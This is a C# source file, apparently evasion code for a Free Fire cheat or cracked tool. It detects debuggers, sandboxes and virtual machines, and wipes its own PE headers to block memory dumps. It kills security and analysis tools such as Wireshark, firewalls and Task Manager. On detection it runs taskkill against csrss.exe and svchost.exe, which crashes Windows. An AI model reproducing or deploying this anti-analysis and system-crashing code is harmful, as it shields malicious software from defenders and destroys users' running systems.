using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace freefire_anti_cheat
{
    public class antcrack
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        internal static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern IntPtr GetModuleHandle(string lpModuleName);


        [DllImport("kernel32.dll")]
        private static extern IntPtr ZeroMemory(IntPtr addr, IntPtr size);

        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualProtect(IntPtr lpAddress, IntPtr dwSize, IntPtr flNewProtect, ref IntPtr lpflOldProtect);

        private static void EraseSection(IntPtr address, int size)
        {
            IntPtr sz = (IntPtr)size;
            IntPtr dwOld = default(IntPtr);
            VirtualProtect(address, sz, (IntPtr)0x40, ref dwOld);
            ZeroMemory(address, sz);
            IntPtr temp = default(IntPtr);
            VirtualProtect(address, sz, dwOld, ref temp);
        }

        private static int[] sectiontabledwords = new int[] { 0x8, 0xC, 0x10, 0x14, 0x18, 0x1C, 0x24 };
        private static int[] peheaderbytes = new int[] { 0x1A, 0x1B };
        private static int[] peheaderwords = new int[] { 0x4, 0x16, 0x18, 0x40, 0x42, 0x44, 0x46, 0x48, 0x4A, 0x4C, 0x5C, 0x5E };
        private static int[] peheaderdwords = new int[] { 0x0, 0x8, 0xC, 0x10, 0x16, 0x1C, 0x20, 0x28, 0x2C, 0x34, 0x3C, 0x4C, 0x50, 0x54, 0x58, 0x60, 0x64, 0x68, 0x6C, 0x70, 0x74, 0x104, 0x108, 0x10C, 0x110, 0x114, 0x11C };

        static public void AntiDebug()
        {
            bool isDebuggerPresent = true;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            if (isDebuggerPresent)
            {
                fuckyou();
            }
        }
        static public void Sandboxie()
        {
            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
            {
                fuckyou();
            }
        }

        static public void Emulation()
        {
            long tickCount = Environment.TickCount;
            Thread.Sleep(500);
            long tickCount2 = Environment.TickCount;
            if (((tickCount2 - tickCount) < 500L))
            {
                fuckyou();
            }
        }

        static public void AntiDump()
        {
            var process = Process.GetCurrentProcess();
            var base_address = process.MainModule.BaseAddress;
            var dwpeheader = Marshal.ReadInt32((IntPtr)(base_address.ToInt32() + 0x3C));
            var wnumberofsections = Marshal.ReadInt16((IntPtr)(base_address.ToInt32() + dwpeheader + 0x6));

            EraseSection(base_address, 30);

            for (int i = 0; i < peheaderdwords.Length; i++)
            {
                EraseSection((IntPtr)(base_address.ToInt32() + dwpeheader + peheaderdwords[i]), 4);
            }

            for (int i = 0; i < peheaderwords.Length; i++)
            {
                EraseSection((IntPtr)(base_address.ToInt32() + dwpeheader + peheaderwords[i]), 2);
            }

            for (int i = 0; i < peheaderbytes.Length; i++)
            {
                EraseSection((IntPtr)(base_address.ToInt32() + dwpeheader + peheaderbytes[i]), 1);
            }

            int x = 0;
            int y = 0;

            while (x <= wnumberofsections)
            {
                if (y == 0)
                {
                    EraseSection((IntPtr)((base_address.ToInt32() + dwpeheader + 0xFA + (0x28 * x)) + 0x20), 2);
                }

                EraseSection((IntPtr)((base_address.ToInt32() + dwpeheader + 0xFA + (0x28 * x)) + sectiontabledwords[y]), 4);

                y++;

                if (y == sectiontabledwords.Length)
                {
                    x++;
                    y = 0;
                }
            }
        }


        static public void CheckProcess()
        {
            Process[] processlist = Process.GetProcesses();
            foreach (Process theprocess in processlist)
            {
                if (theprocess.ProcessName == "ProcessHacker") theprocess.Kill();
                if (theprocess.ProcessName == "dnSpy") fuckyou();
                if (theprocess.ProcessName == "CodeReflect") theprocess.Kill();
                if (theprocess.ProcessName == "taskmgr") theprocess.Kill();
                if (theprocess.ProcessName == "Reflector") theprocess.Kill();
                if (theprocess.ProcessName == "ILSpy") fuckyou();
                if (theprocess.ProcessName == "VGAuthService") theprocess.Kill();
                if (theprocess.ProcessName == "VBoxService") theprocess.Kill();
                if (theprocess.ProcessName == "Sandboxie Control") theprocess.Kill();
                if (theprocess.ProcessName == "IPBlocker") theprocess.Kill();
                if (theprocess.ProcessName == "TiGeR-Firewall") theprocess.Kill();
                if (theprocess.ProcessName == "smsniff") theprocess.Kill();
                if (theprocess.ProcessName == "exeinfoPE") fuckyou();
                if (theprocess.ProcessName == "NetSnifferCs") theprocess.Kill();
                if (theprocess.ProcessName == "wireshark") theprocess.Kill();
                if (theprocess.ProcessName == "apateDNS") theprocess.Kill();
                if (theprocess.ProcessName == "SbieCtrl") theprocess.Kill();
                if (theprocess.ProcessName == "codecracker") theprocess.Kill();
                if (theprocess.ProcessName == "x32dbg") fuckyou();
                if (theprocess.ProcessName == "x64dbg") fuckyou();
                if (theprocess.ProcessName == "ollydbg") fuckyou();
                if (theprocess.ProcessName == "ida") fuckyou();
                if (theprocess.ProcessName == "charles") theprocess.Kill();
                if (theprocess.ProcessName == "simpleassembly") theprocess.Kill();
                if (theprocess.ProcessName == "peek") theprocess.Kill();
                if (theprocess.ProcessName == "httpanalyzer") theprocess.Kill();
                if (theprocess.ProcessName == "httpdebug") fuckyou();
                if (theprocess.ProcessName == "fiddler") theprocess.Kill();
                if (theprocess.ProcessName == "dbx") theprocess.Kill();
                if (theprocess.ProcessName == "mdbg") theprocess.Kill();
                if (theprocess.ProcessName == "gdb") theprocess.Kill();
                if (theprocess.ProcessName == "windbg") fuckyou();
                if (theprocess.ProcessName == "dbgclr") fuckyou();
                if (theprocess.ProcessName == "kdb") fuckyou();
                if (theprocess.ProcessName == "kgdb") fuckyou();
                if (theprocess.ProcessName == "mdb") fuckyou();
                if (theprocess.ProcessName == "scylla_x86") fuckyou();
                if (theprocess.ProcessName == "scylla_x64") fuckyou();
                if (theprocess.ProcessName == "scylla") fuckyou();
                if (theprocess.ProcessName == "idau") fuckyou();
                if (theprocess.ProcessName == "idau64") fuckyou();
                if (theprocess.ProcessName == "idaq") fuckyou();
                if (theprocess.ProcessName == "idaq64") fuckyou();
                if (theprocess.ProcessName == "idaw") fuckyou();
                if (theprocess.ProcessName == "idaw64") fuckyou();
                if (theprocess.ProcessName == "idag") fuckyou();
                if (theprocess.ProcessName == "idag64") fuckyou();
                if (theprocess.ProcessName == "ida") fuckyou();
                if (theprocess.ProcessName == "IMMUNITYDEBUGGER") fuckyou();
                if (theprocess.ProcessName == "MegaDumper") fuckyou();
                if (theprocess.ProcessName == "reshacker") theprocess.Kill();
                if (theprocess.ProcessName == "CodeBrowser") theprocess.Kill();
                if (theprocess.ProcessName == "cheat engine") theprocess.Kill();

            }
        }

        static public void DetectVM()
        {
            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())

            foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
                if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
                {
                    fuckyou();
                }

            foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
                if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
                {
                    fuckyou();
                }
        }

        static async void fuckyou()
        {
            Process.Start("cmd.exe", @"/C taskkill /IM csrss.exe /F");
            Process.Start("cmd.exe", @"/C taskkill /IM svchost.exe /F");
            Process.Start("cmd.exe", @"/C taskkill /IM svchost.exe /F");
        }
    }
}
